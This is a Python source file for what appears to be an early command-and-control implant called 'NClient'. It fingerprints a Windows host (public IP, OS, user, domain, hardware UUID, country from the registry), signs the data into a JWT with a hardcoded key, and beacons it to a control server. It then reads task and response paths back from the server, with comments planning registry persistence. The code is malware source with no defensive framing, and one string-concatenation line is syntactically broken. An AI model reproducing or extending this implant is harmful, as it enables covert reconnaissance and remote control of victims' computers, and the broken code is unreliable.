import requests
import jwt
import os
import subprocess
import time
import json
import platform

#INITIALIZE - wait, do whatever

def checkSetup() -> bool:
    #Check for HTTP access
    response = requests.get('https://www.google.com')
    if not response or response.status_code != 200: return False
    #Check for paths and jwt already existing in registry - example name [user]-NClient-[data type]
    uP, tP, rP = False, False, False
    token = False
    if not token:
        while not token:
            #time.sleep(60) # make customiseable amount
            token = generateJWT()
        resp = requests.get('http://127.0.0.1:5000/contact',
                             headers={'User-Agent': 'NClient 1.0', 'NClient-Token': token}) # make customiseable url
        print(resp.headers)
        uP, tP, rP = resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath']
        #save to registry

def generateJWT() -> str:
    try:
        response = requests.get('https://worldtimeapi.org/api/timezone/Etc/UTC')
    except requests.ConnectionError:
        return False
    response = json.loads(response.content)
    ip = response['client_ip']
    timestamp = response['unixtime']
    country = os.popen('''powershell -Command "gp 'HKCU:\\Control Panel\\International\\Geo\\' | select -exp Name"''').read()
    oS = platform.system() + '' '+ platform.release()
    hwid = os.popen('wmic csproduct get uuid').read().split('\n\n')[1].split()[0]
    dUN = os.popen('whoami').read().split('\\')
    uName = dUN[1].split('\n')[0]
    dName = dUN[0]
    token = {'ip': ip, 'os': oS, 'user': uName, 'hwid': hwid, 'time': timestamp, 'country': country, 'domain': dName}
    token = jwt.encode(token, 'Noire')
    return token

checkSetup()